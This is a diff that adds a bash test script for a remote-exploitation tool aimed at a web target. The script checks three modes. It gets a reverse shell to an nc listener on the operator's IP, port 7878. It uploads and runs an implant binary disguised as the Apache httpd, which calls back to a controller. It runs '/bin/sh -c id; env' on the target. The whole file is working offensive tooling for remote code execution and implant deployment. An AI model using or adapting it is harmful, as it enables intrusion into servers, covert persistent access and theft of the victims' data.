@@ -1,0 +1,72 @@
+#!/bin/bash
+
+
+RUN=${0%%_test}
+TGTURL=$1
+MY_IP=$2
+PASS_CNT=3
+
+if [ -z $TGTURL ] || [ -z $MY_IP ]; then
+   echo "usage: $0 TARGETURL MY_IP" >&2
+   exit 1;
+fi
+
+if ! which noclient; then
+   echo "noclient not found. Put it somewhere in the path." >&2
+   exit 1;
+fi
+
+if ! which noserver.static; then
+    echo "noserver.static not found. Put it somewhere in the path." >&2
+    exit 1;
+fi
+
+echo "id; exit" | nc -lp 7878 &> callback.sh.out &
+echo "$RUN $TGTURL  callback $MY_IP 7878"
+$RUN $TGTURL callback $MY_IP 7878
+to=30;
+while (( $to > 0 )) && ! grep -q 'uid=' callback.sh.out; do 
+    sleep 1;
+    to=$(( $to - 1 ));
+    echo -n .
+done
+
+if grep -q 'uid=' callback.sh.out; then
+    rm -f callback.sh.out
+    echo "PASS callback";
+    let PASS_CNT-=1
+else
+    pkill nc
+    echo "FAIL callback"
+fi
+
+noclient -l 7878 -c '-exit' &> uploadnrun_nopen.no.out &
+echo "$RUN $TGTURL uploadnrun -e 'D=-c $MY_IP:7878' $(which noserver.static) /usr/local/apache/bin/httpd"
+$RUN $TGTURL uploadnrun -e "D=-c $MY_IP:7878" $(which noserver.static) /usr/local/apache/bin/httpd 
+to=30;
+while (( $to > 0 )) && ! grep -q 'Accepted connection from' uploadnrun_nopen.no.out; do 
+    sleep 1; 
+    to=$(( $to - 1 )); 
+    echo -n .
+done
+
+if grep -q 'Accepted connection from' uploadnrun_nopen.no.out ; then
+    rm -f uploadnrun_nopen.no.out 
+    echo "PASS uploadnrun_nopen";
+    let PASS_CNT-=1
+else
+    pkill noclient
+    echo "FAIL uploadnrun_nopen"
+fi
+
+echo "$RUN $TGTURL runexisting -e FOO=BAR /bin/sh /bin/sh -c 'id; env'"
+$RUN $TGTURL runexisting -e FOO=BAR /bin/sh /bin/sh -c 'id; env' > runexisting.out
+
+if grep -q 'uid=' runexisting.out && grep -q 'FOO=BAR' runexisting.out ; then
+    echo "PASS runexisting";
+    let PASS_CNT-=1
+else
+    echo "FAIL runexisting";
+fi
+
+(( $PASS_CNT == 0 )) && echo "ALL TESTS PASSED" || echo "SOME TESTS FAILED"
